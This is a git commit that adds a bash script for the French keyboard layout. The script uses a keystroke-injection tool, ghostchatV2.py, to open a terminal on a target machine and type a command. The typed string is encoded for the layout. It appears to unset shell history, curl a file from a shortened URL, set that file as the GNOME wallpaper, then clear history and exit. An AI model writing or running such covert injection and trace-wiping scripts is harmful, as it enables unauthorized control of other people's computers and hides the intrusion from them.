131257134ea69e37690aa1c693caefc95a8551a8
vvicier <vvicier@madic.com>
2025-08-05 11:38:01 +0200

    sendmimi en fr

---
+++ sendmimifr.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+# Send Ctrl+Alt+T (open terminal)
+python3 /home/debian/ghostchatV2.py -combo "Ctrl+Alt+T" ; python3 /home/debian/ghostchatV2.py --string "nohup bqsh 6c 4unset HISTFILE , I:QGE8URL=3https.>>shorturl<qt>z!JOV3, ZQLLPQPER8PQTH=3]HO:E>;i;i<jpg3, curl 6L 3]I:QGE8URL3 6o 3]ZQLLPQPER8PQTH3 , gsettings set org<gno;e<desktop<bqckground picture6uri 3file.>>]ZQLLPQPER8PQTH3 , gsettings set org<gno;e<desktop<bqckground picture6uri6dqrk 3file.>>]ZQLLPQPER8PQTH34 | >dev>null @|1! 1 history 6c , exit
+"
+
+#python3 ghostchatV2.py -k "enter"
+#python3 ghostchatV2.py -combo "Ctrl+d"
